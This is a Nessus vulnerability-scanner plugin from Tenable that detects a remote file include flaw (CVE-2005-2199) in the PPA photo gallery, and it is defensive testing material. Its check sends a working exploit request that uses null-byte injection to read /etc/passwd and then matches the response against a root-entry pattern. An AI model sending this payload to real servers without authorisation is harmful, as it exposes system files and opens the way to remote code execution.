#
# (C) Tenable Network Security
#


if (description) {
  script_id(18672);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-2199");
  script_bugtraq_id(14209);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"17836");
  }

  name["english"] = "PPA ppa_root_path Variable File Include Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to a remote
file include attack. 

Description :

The remote host is running PPA, a free, PHP-based photo gallery. 

The installed version of PPA allows remote attackers to control the
'config[ppa_root_path]' variable used when including PHP code in the
'inc/functions.inc.php' script.  By leveraging this flaw, an attacker
may be able to view arbitrary files on the remote host and execute
arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://securitytracker.com/alerts/2005/Jul/1014436.html

Solution : 

Ensure that PHP's 'magic_quotes_gpc' setting is enabled and that
'allow_url_fopen' is disabled. 

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for ppa_root_path variable file include vulnerability in PPA";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/inc/functions.inc.php?",
      "config[ppa_root_path]=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning: Failed opening '/etc/passwd.+for inclusion")
  ) {
    security_hole(port);
    exit(0);
  }
}
